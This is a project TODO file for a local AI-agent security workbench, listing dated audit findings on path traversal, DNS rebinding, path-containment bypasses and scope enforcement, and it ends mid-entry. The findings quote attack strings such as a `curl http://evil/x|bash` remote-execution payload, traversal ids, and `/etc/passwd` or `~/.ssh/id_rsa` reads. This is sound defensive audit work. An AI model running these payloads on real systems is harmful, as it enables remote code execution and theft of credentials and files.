# TODO

All 11 tasks from the original build plan are done (see `DEVELOPMENT.md` for the full history).
This is the actionable list for what's next.

## Audit findings (2026-08-07)

Full-project audit (backend security, backend architecture/correctness, frontend correctness) -
three parallel reviews plus manual spot-checks, all findings below were verified by reading the
actual current code (or, for the path-traversal item, a pure computation with no filesystem
touched - no exploit was actually run against the live backend). Every finding across all three
severities has since been fixed, each in its own follow-up pass (High first, then all six Medium,
then all seven Low) - see each item's own note for what changed and DEVELOPMENT.md for the full
write-up of each pass. Only the Plugin system (see "Later" below) remains genuinely open.

### High

- [x] **`projectId` is never format-validated anywhere it reaches a filesystem path — real
      path-traversal / arbitrary file write & delete.** Fixed at the single chokepoint every
      project-scoped filesystem path actually funnels through:
      `services/projectStore.ts#projectDir(id)` now rejects anything that isn't UUID-shaped
      (`PROJECT_ID_PATTERN`, mirroring `agentManager.ts`'s existing `AGENT_ID_PATTERN` check)
      before ever building a path, throwing a new `InvalidProjectIdError` (400
      `INVALID_PROJECT_ID`). Every service (`toolManager.ts`, `orchestrator.ts`,
      `multiAgentOrchestrator.ts`, `findingsManager.ts`, `scanRunner.ts`, `reportManager.ts`) only
      ever reaches disk via `projectDir`/`readProjectJson`/`writeProjectJson`, or
      `projectManager.ts`'s own direct `projectDir()` calls - fixing it in that one place covers
      all of them without touching each individually, and can't be forgotten for a future one.
      `readProjectJson`/`projectManager.ts#readProjectMeta` were also restructured to resolve
      `projectDir(id)` *outside* their `catch { return [] / undefined }` blocks, so a rejected id
      surfaces as a real error instead of silently looking identical to "no data yet". 5 new
      regression tests in `projectManager.test.ts` (235 total) - malformed ids and literal
      `"../../../../tmp/pwn"`-style traversal attempts on `getProject`/`updateProject`/
      `deleteProject`/`readProjectJson`/`writeProjectJson`, asserting nothing was created on disk.
      Verified live against the real running backend (not just tests): the exact
      `projectId: "../../../../tmp/8rack-poc"` payload from the original audit now gets rejected
      with a clean 400 before any directory is created (confirmed via `ls` - no leaked directory
      anywhere), reproduced against `/api/orchestrator/tasks`, `/api/tools/request`, and
      `/api/projects/:id/scans`; a normal project (real UUID) still creates/round-trips correctly.
      See DEVELOPMENT.md's "Fixed: projectId path-traversal" section.

### Medium

- [x] Backend binds to all interfaces (`app.listen(env.port, ...)` in `index.ts` with no host
      argument defaults to `0.0.0.0`), not just localhost. Fixed: `env.host` (new, defaults to
      `127.0.0.1`, overridable via `HOST`) is now passed to `app.listen(env.port, env.host, ...)`.
      Verified live via `ss -ltnp` - the real running backend now shows `LISTEN 127.0.0.1:3001`,
      not `0.0.0.0:3001`; the frontend's Vite proxy (`localhost:3001`) still resolves and works
      correctly. `.env.example` documents the new `HOST` var and the tradeoff of changing it.
- [x] The workspace path-containment check (`toolManager.ts#isPathContained`/`looksLikePath`) is
      effectively theater for `bash -c "<script>"`/`python3 -c "<code>"`. Fixed: both tools'
      descriptions (`tools/exec/builtins.ts`) now say explicitly "NOT confined to the workspace
      root - the script string isn't checked for path containment... Review the exact resolved
      command before approving", and the module's own doc comment explains why. This is exactly
      what's shown in the Tool Registry and every Approve/Reject confirm card already, so the
      caveat reaches a reviewer at the point it matters without any new UI.
- [x] Chat sessions can opt into tool use mid-conversation but doing so silently starts a
      brand-new `OrchestratorTask` with no prior context. Fixed with the "explicit notice" option
      (not history-seeding - `useChat`'s messages and an `OrchestratorTask`'s are different shapes
      with no clean lossless conversion): `ChatSessionPanel.tsx` now shows an amber notice above
      `ChatTaskPanel` whenever the session has prior plain-chat messages, explicitly stating they
      aren't shown here and aren't seen by the agent, and how to see them again (switch Project
      back to "No project"). Turns out the prior messages weren't even still visible "above" as
      the original finding assumed - picking a project fully replaces the chat body with
      `ChatTaskPanel`, so this notice is the only place that fact was surfaced at all. 4 new
      frontend tests (`ChatSessionPanel.test.tsx`), verified live in-browser (sent a plain message,
      enabled tools, saw the exact notice with the correct count/agent name, switched back and
      confirmed the original messages were still there).
- [x] Concurrent writes to the same project's JSON history files can race. Fixed: a small
      per-`{projectId}:{filename}` write queue in `projectStore.ts` (`enqueueWrite`) serializes
      `writeProjectJson` calls so overlapping writes can never complete out of call order - a
      failed write doesn't wedge the queue (`.then(task, task)`, not just `.then(task)`), and
      different files for the same project don't needlessly block each other. 3 new tests proving
      out-of-order completion is prevented (a deliberately-delayed first write still lands before a
      second one is allowed to actually write), that a failed write doesn't block the next one, and
      that unrelated files stay independent.
- [x] Corrupted/truncated project JSON is silently treated as "no data" with zero logging. Fixed:
      `readProjectJson` (`projectStore.ts`) and `readProjectMeta` (`projectManager.ts`) now
      distinguish a missing file (silent, expected) from a file that exists but fails `JSON.parse`
      (`console.warn` naming the project id and filename, still returns the same graceful
      empty/undefined fallback). 2 new tests asserting the warning fires for invalid JSON and stays
      silent for a plain missing file.
- [x] Startup hydration ran after the HTTP port was already accepting connections with no
      `try/catch`, so a thrown error was an unhandled rejection that silently aborted the rest of
      startup. Fixed: the whole hydration body in `index.ts`'s `app.listen(...)` callback is now
      wrapped in try/catch with a clear `console.error` naming what may not have loaded, without
      crashing the process (none of the routes strictly depend on hydration completing - they just
      read from each service's in-memory state, which starts empty either way). The "gate requests
      behind a 503 until ready" half of the original suggestion was deliberately skipped as a
      bigger architectural change than this pass warranted. Verified live: server restarted
      cleanly, `/health` and the frontend proxy both still work.

      See DEVELOPMENT.md's "Fixed: the six Medium audit findings" section for all six.

### Low

- [x] No flag-injection guard on a scan's `target` (`scanRunner.ts#substituteTarget`). Fixed:
      `requireTarget` now rejects any target starting with `-` (new `InvalidScanTargetError`, 400
      `INVALID_REQUEST`), checked before either `previewScan` or `createScanRun` do anything else.
      2 new backend tests; verified live via curl (`POST /scans/preview` with target
      `-oG=/tmp/evil` → clean 400 with an explanatory message, nothing created).
- [x] Deleting an agent never pruned that agent's session entries in `hooks/useSessions.ts`. Fixed:
      new `pruneOrphanedSessions(validAgentIds)` (drops any session, including a closed-but-retained
      chat session, whose `agentId` isn't in the given set - manual/no-agent sessions are always
      kept), called from a new `App.tsx` effect whenever `agents` changes, gated on
      `!agentsLoading` so the transient empty list before the first fetch resolves can't wrongly
      prune everything on initial load. 3 new frontend tests.
- [x] Closing a chat/task session tab mid-request didn't cancel the in-flight fetch. Fixed: both
      `useChat.ts` and `useOrchestratorTask.ts` now have an unmount-cleanup effect
      (`return () => abortRef.current?.abort()`) - confirmed this actually matters (these hooks'
      owning panels really do unmount for real on close, not just get CSS-hidden like inactive
      tabs - see `hooks/useSessions.ts#closeSession`). 2 new tests (one per hook) proving the abort
      signal fires exactly on unmount, not before.
- [x] Confirmed dead code with zero live importers: ~~`extensions/reportGenerator.ts`~~,
      `extensions/retrievalRegistry.ts`, `extensions/pluginRegistry.ts`, and the types that exist
      only to support them (`types/plugin.ts` - `types/report.ts` no longer applies, see below).
      Different from `extensions/toolRegistry.ts`/`types/tool.ts`, which *are* wired into a live
      path (`ollama.ts` → `routes/chat.ts`) even though functionally inert (zero tools registered) -
      already documented as intentional. `extensions/reportGenerator.ts` is resolved: deleted
      outright (not wired up) when Report generation was built for real - see below and
      DEVELOPMENT.md's "Report generation" section. `retrievalRegistry.ts`/`pluginRegistry.ts`/
      `types/plugin.ts` are still the real "written once, never connected, never revisited"
      leftovers - either wire them up when the Plugin system (see "Later" below) actually gets
      built, or delete them now.
- [x] Test coverage gaps: `services/ollama.ts` had no `.test.ts` at all despite being genuinely
      complex (the Ollama REST client + native tool-calling round trip). Fixed: new
      `ollama.test.ts`, 29 tests - NDJSON parsing/buffering (including a line deliberately split
      across two reads, and a final line with no trailing newline), every error mapping
      (`OllamaModelNotFoundError`/`OllamaConnectionError`/`RequestCancelledError`/
      `EmbeddingModelUnavailableError`/plain `OllamaRequestError`), `resolveOllamaTools`, and the
      full `streamChatWithTools` round trip (native `tool_calls`, the tag-noncompliant fallback
      parser, an unregistered-tool error result, the `MAX_TOOL_ROUNDS` cap actually stopping at 4).
      `services/projectStore.ts`'s own gap was already closed as a side effect of the projectId/
      write-queue/corrupted-JSON Medium-severity fixes earlier in this audit (`projectManager.test.ts`
      now exercises its real `readProjectJson`/`writeProjectJson`/`listProjectIds` via the shared
      `fakeFs` double, not a mocked-away `projectStore.js`).
- [x] `README.md`'s feature list predated the Findings Engine, CVE lookup, Security Scanners, and
      Report generation. Fixed: added all four to the Features list, plus the missing `HOST` and
      `NVD_API_KEY` rows in the Configuration table (both real gaps from earlier fixes in this
      audit that hadn't made it into the README at the time).
- [x] `CLAUDE.md`'s "Architecture" section was still the original Task-11 scaffold. Fixed: full
      rewrite of both directory trees (backend `src/`/`data/`, frontend `src/`) to reflect the
      current real structure, a new services-file reference table, and three new short prose
      sections a future session most needs oriented on fast - "Two tool-calling mechanisms" (native
      Ollama `tool_calls` vs. the Orchestrator's own plain-text convention - genuinely easy to
      conflate), "Projects" (the `projectId`/`projectStore.ts` convention nearly everything is keyed
      on, including a pointer to the path-traversal fix), and a correction to the stale "Agents"
      section's claim that `Agent.tools` "isn't read anywhere yet" (it, and `Agent.execTools`, both
      are). Deliberately keeps this file as a map with pointers, not a duplicate of
      `DEVELOPMENT.md`'s much more detailed per-feature sections.

### Already fixed during this audit (cheap, unambiguous doc-accuracy errors)

- [x] `DEVELOPMENT.md`/`TODO.md` claimed "231 total" backend tests after the Security scanners
      work landed - actual was 220 (a plain arithmetic slip, not a stale historical entry). Both
      corrected to 220.
- [x] `CLAUDE.md` said "There are no automated tests yet" - stale from before the very first test
      suite was added. Corrected to describe the real `npm test` setup on both sides.

## Audit findings (2026-08-08)

Full-project re-audit (backend security, backend architecture/correctness, frontend correctness) -
three parallel reviews plus manual verification of every High/Medium item against the actual
current code (which now includes the uncommitted Tasks 1-3 work: scope enforcement, Mission
Editor/Assets/Activity, agent tool allowlists, etc.). All findings below were confirmed by reading
the code; nothing was exploited against the live backend. **None of these are fixed yet** - this is
a findings list, pending a decision on scope like last time. Baseline sanity checks pass: backend
`npm test` 328/328, frontend `npm test` 252/252, both typechecks clean, `oxlint` clean (5 pre-existing
`only-export-components` warnings).

### High

- [ ] **No Host-header/Origin/CSRF defense on a no-auth tool-execution API - browser-triggerable
      RCE via DNS rebinding.** `backend/src/index.ts:40` (`cors({ origin: env.corsOrigin })`) only
      gates cross-origin *reads* in browsers; there is no Host-header allowlist, no Origin/Referer
      check, and no CSRF token anywhere in the request path. The app binds `127.0.0.1` by default
      (`env.ts:15`), but that does not stop DNS rebinding: a malicious page served from `evil.com`
      with a short-TTL record switching to `127.0.0.1` becomes *same-origin* to `evil.com:3001`, so
      its `fetch("http://evil.com:3001/...")` bypasses CORS entirely. The chain is fully
      unauthenticated and needs no valid project: `POST /api/tools/request`
      (`{"tool":"bash","arguments":["-c","curl http://evil/x|bash"]}`) then
      `POST /api/tools/executions/:id/confirm` = arbitrary command as the backend user. The
      `confirm` route never re-checks scope/enabled state/requester; the same applies to every other
      mutating endpoint (`/api/orchestrator/tasks`, `/api/projects/:id/scans` which auto-confirms
      steps, `/reject`, `/cancel`, agent create/update). A LAN peer or any host-local process is the
      documented tradeoff, but the *browser* vector is not covered by loopback binding. Suggested
      fix: a Host-header allowlist middleware (`localhost`/`127.0.0.1`/`[::1]:3001`) before routing
      - the standard DNS-rebinding mitigation - plus reject `CORS_ORIGIN=*` in `env.ts` (currently
      accepted without warning) and, ideally, a per-install random bearer token or custom-header +
      same-site check on mutating endpoints.
- [ ] **`cancelTask`/`cancelPlan` don't abort an in-flight generation - a cancelled task can be
      silently resurrected and spawn a new tool execution after the user cancelled it.**
      `backend/src/services/orchestrator.ts:800-825` (`cancelTask` is synchronous and only mutates
      the in-memory object; it has no handle on the AbortController driving the still-running
      `advance`). The only signal `advance` ever sees is the *creating request's* client-disconnect
      signal (`streamUtils.ts`). If a cancel arrives from a different connection (second tab, curl,
      `cancelPlan`), or in the window between generation finishing and the disconnect being
      observed, `advance` keeps going: pushes the assistant message, parses a tool request, calls
      `requestExecution` and sets `status = "waiting_confirmation"` (`:550-633`) - resurrecting a
      terminal-`"cancelled"` task and queueing a real subprocess the user already decided against.
      The frontend's single-tab flow masks this by aborting its own stream first
      (`useOrchestratorTask.ts`), but the backend contract is not enforced. Suggested fix: hold a
      per-task `AbortController` (keyed map, like `toolManager.ts`'s `runningControllers`) that
      `cancelTask` aborts, and have `advance` bail to `"cancelled"` after each `await` if
      `signal.aborted`/`task.status !== "running"` - before creating any execution.
- [ ] **Session wipe on a failed agents fetch.** `frontend/src/App.tsx:68-74` runs
      `sessions.pruneOrphanedSessions(new Set(agents.map((a) => a.id)))` gated only on
      `agentsLoading` - but `useAgents.ts:18-22` leaves `agents` as its initial `[]` when
      `fetchAgents` fails (only `error` is set, `loading` goes false). So if the *first* `GET
      /api/agents` fails (backend briefly down at startup, transient blip), this permanently removes
      every agent-keyed session from `sessionStorage` - including closed-and-retained chat sessions,
      which `useSessions.ts` says have no other eviction path. Silent, no undo; the message
      histories remain as orphaned `8rack:chat-history:*` keys but are unreachable. Suggested fix:
      bail on error too - `if (agentsLoading || agentsError) return;` (`agentsError` is already
      destructured in `App.tsx`).

### Medium

- [ ] **Workspace path-containment is lexical and bypassable** (`backend/src/services/toolManager.ts:141-168`).
      `isPathContained` does a pure `path.resolve(base, candidate)` + `path.relative` string check -
      no `realpath`, no `~` handling, no parsing of flag/value pairs, no visibility into shell/script
      strings. Verified bypasses: (1) `bash`/`python` script strings - `arguments: ["-c", "cat
      /etc/passwd"]` resolves *relative* to base (the embedded leading `/` is just a segment), so it
      passes containment even though the spawned shell reads anywhere - the code's own comment in
      `builtins.ts` acknowledges this, but the filesystem tools' "confined" claim is false too;
      (2) flag-value paths - `curl -o/tmp/x`, `curl --output-dir=...`, `git --git-dir=/etc` embed the
      absolute path inside a single argv element that resolves inside base; (3) bare `..` contains no
      `/` and isn't `.`, so `looksLikePath("..")` is false and it's never checked at all (`ls ..`
      lists the workspace parent); (4) symlinks planted inside the workspace are not `realpath`-ed,
      so `read_file`/`grep`/`find` can read anywhere through one. (Note: a literal `~/.ssh/id_rsa`
      argv element is *not* expanded by `cat`/`tee` - spawn passes it verbatim - so that particular
      sub-case fails with ENOENT rather than reading the file; `bash -c "cat ~/..."` and `git` do
      expand it.) Suggested fix: resolve candidates via `fs.realpath` and require containment on the
      real path; reject `~` outright; explicitly reject bare `..`; and surface the script-string and
      file-writing tools (`bash`/`python`/`curl -o`/`git`/`write_file`) as out-of-confinement in the
      confirm card rather than claiming workspace containment.
- [ ] **Mission-scope enforcement is bypassable and silently skipped for unknowns.**
      `backend/src/services/scopeMatcher.ts:12` matches IPv4 only (no IPv6, no decimal/hex IP forms,
      no `localhost`/single-label names, no IDN) - so `curl http://[::1]/` or `2130706433` yields
      zero targets → verdict `"unknown"` → `scopeWarning` only, runs anyway even for an allowlist
      project where "unknown" *is* the out-of-scope case. Scope is only checked when
      `getProject(body.projectId)` resolves (`toolManager.ts`); a nonexistent project yields
      `undefined` → scope silently not checked and *no warning recorded* at all. `confirmExecution`
      never re-runs the check, so a target can be swapped between request and confirm. Scope entries
      with a port (`"example.com:8080"`) never match anything (`extractTargets` strips ports).
      Suggested fix: add IPv6; normalize IP forms before matching; treat "unknown" as blocking when
      a strict `scope` allowlist is configured; warn/block on `project === undefined`; re-check at
      confirm time.
- [ ] **Outbound HTTP has no timeout anywhere** - `backend/src/services/ollama.ts:23` (`ollamaFetch`)
      and `backend/src/services/cveLookup.ts:117` both `fetch` with no `AbortSignal`. A hung Ollama
      (wedged model load) or dead-but-open NVD connection blocks the request indefinitely. Note the
      orchestrator's `maxOrchestratorTaskTimeMs` is only evaluated at `advance()` entry
      (`orchestrator.ts:527`), so a hung `lookup_cves` pseudo-tool (no human confirmation, called
      directly by the agent) pins the task past the cap forever. Suggested fix:
      `AbortSignal.timeout(...)` on all outbound fetches (bounded for NVD, longer but still bounded
      for Ollama chat).
- [ ] **Streamed tool output is uncapped and there's no global execution concurrency limit.**
      `backend/src/services/toolExecutor.ts:64` calls `onOutput` *before* the truncation check, so a
      tool emitting >1MB (e.g. `bash -c 'head -c 100000000 /dev/urandom | base64'`, huge `ffuf`
      wordlists) streams unbounded data to the confirming client and memory-buffers `res.write`
      under backpressure - only the accumulated `stdout` string is capped. Combined with zero
      in-flight cap on `requestExecution`/scans/tasks, a reachable caller can drive OOM/fork
      exhaustion. Suggested fix: cap streamed bytes per execution on the `onOutput` path (same 1MB
      limit), and add a global in-flight execution/scan/task limiter.
- [ ] **Chat `options` forwarded unvalidated → local Ollama OOM.** `routes/chat.ts:48-51`,
      `routes/agents.ts:110`, `chatService.ts:47-53` cast `body.options` straight through to Ollama;
      a huge `num_ctx`/`num_predict` (or out-of-range temperature/top_p) makes the local Ollama
      allocate context RAM per request. Suggested fix: clamp/whitelist server-side (e.g.
      `num_ctx ≤ 131072`).
- [ ] **`deleteProject` leaves all in-memory state intact; ghost records persist and can be
      re-hydrated.** `backend/src/services/projectManager.ts:79-83` only `rm`s the directory. The
      per-service `Map`s (`orchestrator.ts`, `toolManager.ts`, `findingsManager.ts`, `scanRunner.ts`,
      `reportManager.ts`, `multiAgentOrchestrator.ts`) still return records for the deleted project,
      and any later write recreates the dir because `writeProjectJson` does `mkdir(recursive)` -
      e.g. an in-flight scan/task during deletion, or a new `requestExecution` reusing the id, then
      next boot re-hydrates from the recreated dir. Suggested fix: purge the project's records from
      every store on delete (or gate project-scoped writes on project existence).
- [ ] **Task transcripts grow unboundedly and embed full (1MB each) tool output** -
      `backend/src/services/orchestrator.ts:692-710` serializes `execution.result.stdout/stderr`
      verbatim into a tool-role message; there is no cap on `task.messages` length or cumulative
      bytes, so `orchestrator-tasks.json` grows without bound and each `advance` resends the whole
      (ever-growing) history to Ollama. Suggested fix: truncate tool-result payloads stored in
      `task.messages` to a few KB (matching what the frontend renders), and/or cap message count.
- [ ] **Project-scoped data hooks can land stale responses after a quick project switch.**
      `frontend/src/hooks/useTools.ts:13-28`, `useFindings.ts:12-27`, `useActivity.ts:16-34`,
      `useReports.ts:16-31`, `useScans.ts:29-44` - each `refresh` depends only on `[projectId]`, no
      AbortController and no "still the current project" check; views stay mounted forever and each
      view has its own project selector, so a slow response for project A resolving after project B
      can render the wrong project's executions/findings/reports/scans/tasks (and the late
      `finally { setLoading(false) }` clears loading early). Suggested fix: guard at resolution time
      with a `projectIdRef` comparison (the pattern `useChat`/`useOrchestratorTask` already use).
- [ ] **`ProjectPanel.disabled` (the documented mid-task lock) is never wired in the Workbench.**
      `frontend/src/components/OrchestratorWorkbench.tsx:108-118` renders `<ProjectPanel … />`
      without `disabled`, though `ProjectPanel.tsx:18-20` documents it as the guard against
      switching/deleting the project mid-task and `MultiAgentPlanner.tsx:180` shows the intended
      wiring. While a task session or a scan is running, the user can deselect/delete the project;
      `useScans.ts:103` then appends a scan that finished for the *old* project into the *new*
      project's list. Also `ProjectPanel.tsx:158-164` uses `aria-disabled` on a real `<button>`,
      which doesn't block keyboard activation (Enter/Space still fire `onClick`). Suggested fix:
      pass `disabled` from the Workbench when any task session is non-terminal or a scan is running,
      and guard inside the handler or use a real `disabled`.
- [ ] **`Sheet` is a modal with no focus management** - `frontend/src/components/ui/Sheet.tsx:18-44`:
      no `role="dialog"`/`aria-modal`, no focus trap (Tab reaches background content), no Escape-to-
      close, no focus move-in/restore. Affects five surfaces: `SettingsPanel.tsx:25`,
      `AgentEditor.tsx:166`, `MissionEditor.tsx:136`, `FindingDetails.tsx:168`, `ReportsPanel.tsx:86`.
      Suggested fix: `role="dialog" aria-modal="true"`, autofocus, trap Tab, close on Escape, restore
      focus to the opener on close.

### Low

- [ ] `assertNotPrivileged` is case-sensitive (`backend/src/services/toolManager.ts:177`) -
      `/\b(sudo|doas|pkexec|su)\b/` misses `Sudo`/`SUDO`; with no TTY most sudo installs still fail,
      so this is belt-and-suspenders, but make it case-insensitive and also reject `setsid`/`env`-
      wrapped variants.
- [ ] Cancel/timeout kills the direct child, not the process group (`backend/src/services/toolExecutor.ts:75-77`) -
      no `detached:true` + `kill(-pid)`, so `bash -c 'sleep 3600 &'` leaks orphan processes; repeated
      aborts accumulate.
- [ ] Log injection / server-path disclosure - `toolManager.ts` logs `record.resolvedCommand`
      (agent-controlled argv, can contain ANSI/newlines); `InvalidToolArgumentsError` echoes
      `env.workspaceRoot` verbatim to any caller, disclosing the server filesystem layout.
- [ ] RAG index persists full file text; a misconfigured `WORKSPACE_ROOT` (`.`, `..`, or `backend/`)
      would index `backend/data/projects/*` (sensitive scope/notes/evidence) and make it retrievable
      via `search_knowledge_base`. Dotfiles/symlinks are already skipped.
- [ ] Prompt injection surface: scanner/parser output and finding evidence (attacker-controlled web
      content) is fed raw into the report-writer prompt and re-enters the orchestrator transcript;
      and unauthenticated `POST/PUT /api/agents` lets a rebinding/LAN attacker rewrite
      `systemPrompt`/`execTools` of agents the human later drives. Bind this to whatever auth is
      added for the High item.
- [ ] No security headers (no `X-Content-Type-Options`/`X-Frame-Options`); `CORS_ORIGIN=*` accepted
      without warning.
- [ ] `maxOrchestratorTaskTimeMs` is only enforced *between* agent calls, not during a single
      generation (`orchestrator.ts:527`) - a single long model call runs past the cap. Document as
      loop-only or pass a deadline into `collectAgentReply`.
- [ ] Multi-agent plan flattens distinct terminal statuses - a step ending `max_executions_reached`/
      `max_time_reached` maps the plan to `failed` (`multiAgentOrchestrator.ts:116-118`); `plan.error`
      is the only trace. Deliberate, but worth a doc line.
- [ ] `pendingStdin` entries are never evicted for abandoned `pending_confirmation` executions
      (`toolManager.ts:339`) - a large `write_file` payload stays resident for the process lifetime.
- [ ] `activeExecutionByScan` leaks a stale id if `confirmExecution` throws (`scanRunner.ts:171-175`);
      a `cancelScanRun` in that window calls `cancelExecution` on a dead id and swallows the throw.
      Put the delete in a `finally`.
- [ ] `listExecToolsWithStatus` runs synchronous child processes inside request handlers
      (`toolManager.ts:101-138`, ~20 tools × up to two `spawnSync` probes incl. a 3s version timeout)
      on every `GET /api/tools`, `PATCH /api/tools/:id`, and scan preview - blocks the event loop.
      Memoize with a short TTL or probe async.
- [ ] No timeout/abort on RAG reindex (`ragIndex.ts:119-161`, `routes/rag.ts:12-18`) - a hung Ollama
      leaves `POST /api/rag/reindex` hanging indefinitely, and a second reindex isn't coordinated.
- [ ] Frontend `OrchestratorTask` type omits `projectId` and `model`
      (`frontend/src/types/orchestrator.ts:18-31` vs `backend/src/services/orchestrator.ts:59-77`) -
      a strict subset, so it typechecks but future backend fields are silently invisible.
- [ ] `lastPositionalArg` misattributes the target for `dig <domain> <type>` (`parsers/index.ts:24`,
      `parsers/shared.ts:16-21`) - `dig example.com A` attributes findings to `"A"`. Use the first
      non-flag arg for dig/whois.
- [ ] Creation status codes are inconsistent (200 for projects/tools, 201 for findings/agents,
      streaming for scans/orchestrator/plans/reports) - cosmetic, but worth standardizing.
- [ ] Five near-identical NDJSON write/error loops (`streamUtils.ts` vs `routes/orchestrator.ts:32-60`,
      `plans.ts:53-81`, `tools.ts:99-130`, `scanners.ts:94-110`, `reports.ts:70-95`) with subtly
      different event types - a shared "stream terminal object" helper would remove the drift risk.
- [ ] Confirmed dead/inert code: `extensions/pluginRegistry.ts` + `extensions/retrievalRegistry.ts`
      zero importers (the still-planned Plugin system); `toolRegistry.ts` empty so any agent setting
      `tools` throws `UnknownToolError`. All documented in CLAUDE.md - keeping them intentional, not
      new findings.
- [ ] `Markdown.tsx:22` code-block copy button is keyboard-invisible (no `focus-visible:opacity-100`)
      and `handleCopy` (`Markdown.tsx:11-15`) has no `try/catch` - `navigator.clipboard.writeText`
      can reject (permissions/insecure context), producing an unhandled rejection.
- [ ] Finding drawer can show a stale cross-project finding - `FindingsView.tsx:161` falls back to
      the previous project's finding object after a project switch (only `selectedIds` is cleared,
      not `selectedFinding`); an update issued from that drawer would PATCH the old project's finding.
- [ ] Doc drift: DEVELOPMENT.md says "3 pre-existing `only-export-components` warnings" - `oxlint`
      now reports 5 (`FindingsTimeline.tsx` + `OrchestratorTaskView.tsx`). Everything else checked
      (test counts 328/252, feature claims, `.env.example` keys) is accurate.

## Next up

- [x] Wire up one real `Tool` end-to-end through Ollama's native tool-calling API, surfaced via
      `POST /api/chat`. Done: `calculator` tool + `streamChatWithTools` loop in
      `backend/src/services/ollama.ts`, verified via curl. See DEVELOPMENT.md's "Tool-calling round
      trip" section for the local-model tag-compliance gap this surfaced and the fallback parser it
      required.
- [x] Surface tool-calling in the frontend. Done: a "Calculator tool" checkbox in `PromptInput`
      (state in `App.tsx`), and `ChatMessageView` renders tool-call/tool-result messages as
      distinct bubbles. Verified live in-browser with both `qwen2.5-coder:7b` (clean single round)
      and `:0.5b` (hit the 4-round safety cap after repeatedly mis-reading the expression — good
      real-world proof the cap works).
- [x] Implement the AI Agent framework: Agent Manager (`backend/src/services/agentManager.ts`) +
      reusable Chat Service (`backend/src/services/chatService.ts`), exposed via
      `GET/POST /api/agents/*`. Full required config schema (id, name, description, model,
      systemPrompt, temperature, topP, maxTokens, icon, color, enabled), model-availability
      validation with graceful online/offline status (never throws), reload endpoint, and the 8
      default agents from the spec (Planner, Recon Agent, Web Analyzer, Code Assistant, Output
      Parser, Vulnerability Validator, Report Writer, General Assistant). Frontend: AgentList shows
      icon/description/model/status, selecting an agent locks the model dropdown and seeds
      temperature/topP/maxTokens, chat routes through `POST /api/agents/:id/chat` when an agent is
      active. See DEVELOPMENT.md's "Agent Manager & Chat Service" section for the full design and
      what was verified.
- [x] Removed the `calculator` tool and its "Calculator tool" checkbox in `PromptInput` (per user
      request, now that the Tool Execution Framework/Orchestrator supersede it as the real
      tool-use path). `toolRegistry` currently has zero tools registered — the native
      Ollama-tool-calling round trip (`resolveOllamaTools`/`streamChatWithTools`) is still there,
      just unreachable from the UI until something new is registered. See DEVELOPMENT.md's
      "Tool-calling round trip" section for the update note.
- [x] Read `Agent.tools?: string[]` when building the agent-chat request so selecting an agent
      activates its own tools automatically. Done: `chatService.ts#streamAgentChat` now falls back
      to `agent.tools` when the request doesn't specify any (`request.tools ?? agent.tools`), same
      override-layering convention as the `model`/`options` fallbacks already there — but only when
      `toolsPreamble` is absent, since that field is the Orchestrator's own tell (it speaks a
      separate plain-text tool-request convention and never uses Ollama's native `tool_calls`;
      activating both on the same request would let the model reply in whichever format it
      preferred instead of the one actually being parsed). Still functionally inert right now — no
      shipped agent config sets `tools`, and `extensions/toolRegistry.ts` has zero tools registered
      — but the plumbing is now correct and ready for whenever that changes. 4 new tests (123 total).
      Verified no regression via a live plain agent-chat call. See DEVELOPMENT.md's "Agent.tools
      activation" section.
- [x] Implement the Tool Execution Framework, Phase 1 (engine + confirmation gating, no
      orchestrator/UI yet): `services/toolExecutor.ts` (generic OS-process runner: argv-only spawn,
      AbortController-based cancel/timeout, streaming output, output truncation) +
      `services/toolManager.ts` (registry, `which`-based availability, argument validation incl.
      workspace-root path containment, pending-confirmation execution lifecycle) + all ~20 tools
      from the spec (`tools/exec/builtins.ts`) + `GET/POST /api/tools/*`. Every tool requires human
      confirmation before running and filesystem tools are confined to `env.workspaceRoot` — both
      confirmed with the user before implementation given an AI agent could otherwise autonomously
      run `nmap`/`bash`/etc. against the real machine. Verified via curl: availability detection,
      request→confirm→streamed-output round trip, workspace-escape rejection, timeout, and
      mid-stream cancellation. See DEVELOPMENT.md's "Tool Execution Framework" section — the
      Orchestrator (autonomous tool-calling loop) and both UI surfaces (Tool Registry, Execution
      Console) are explicitly deferred to follow-up work, along with project-scoped history (no
      "project" concept exists in the app at all yet).
- [x] Build the Orchestrator: `services/orchestrator.ts`, a pause/resume task state machine
      (`running → waiting_confirmation → running → ... → completed/failed/cancelled/
      max_executions_reached/max_time_reached`) since every tool requiring confirmation means the
      loop can't run start-to-finish in one request. Detects a tool request via a plain-text JSON
      convention (`buildToolsPreamble`/`parseToolRequest` — separate from Ollama's native
      `tool_calls` mechanism), executes through the existing `toolManager` confirm/reject flow
      unchanged, feeds the result back, repeats. Loop-prevention via env-configurable
      `MAX_ORCHESTRATOR_TOOL_CALLS`/`MAX_ORCHESTRATOR_TASK_TIME_MS`, counting failed/invalid tool
      requests toward the cap too so a misbehaving model can't retry forever. Exposed via
      `POST/GET /api/orchestrator/tasks*`. Verified via curl: a real task reaches
      `waiting_confirmation`, confirming + resuming feeds the tool's actual output back and the
      agent produces a final answer referencing it, cancel and the executions cap both work. See
      DEVELOPMENT.md's "Orchestrator" section.
- [x] Build the Tool Registry UI + Execution Console UI + an interactive Orchestrator — done as
      the "Workbench" nav tab (`components/OrchestratorWorkbench.tsx` + `ToolRegistry.tsx` +
      `ExecutionConsole.tsx`, `hooks/useTools.ts` + `useOrchestratorTask.ts`,
      `services/toolsApi.ts` + `orchestratorApi.ts`). Confirm/reject is now a real Approve/Reject
      UI instead of curl. Three real bugs were caught and fixed via in-browser testing (not
      caught by curl or typecheck): stale objective text on new task, a stale-`useEffect`-key bug
      that hid the confirm card after a rejected/retried tool request, and leftover live output
      leaking into the next pending confirmation. See DEVELOPMENT.md's "Workbench UI" section.
- [x] Stream the agent's own text token-by-token during an orchestrator task. Done:
      `services/orchestrator.ts`'s `collectAgentReply`/`advance`/`createTask`/`resumeTask` now take
      an optional `onChunk` callback and `AbortSignal`, threaded through from
      `routes/orchestrator.ts` — `POST /tasks` and `POST /tasks/:id/resume` now respond with
      NDJSON (`{type:"chunk"|"task"|"error"}`) instead of a single JSON body, mirroring the
      existing confirm-execution stream in `routes/tools.ts`. Frontend:
      `services/orchestratorApi.ts#streamTask` reads the stream, `useOrchestratorTask`'s new
      `streamingText` accumulates it (cleared on settle), `OrchestratorWorkbench` renders it live
      with a blinking-cursor style — including during the initial "Starting…" phase before a task
      object exists yet, which was a real gap caught via in-browser testing (the first version only
      rendered streaming text inside the `task &&` block, so the create-task step showed a static
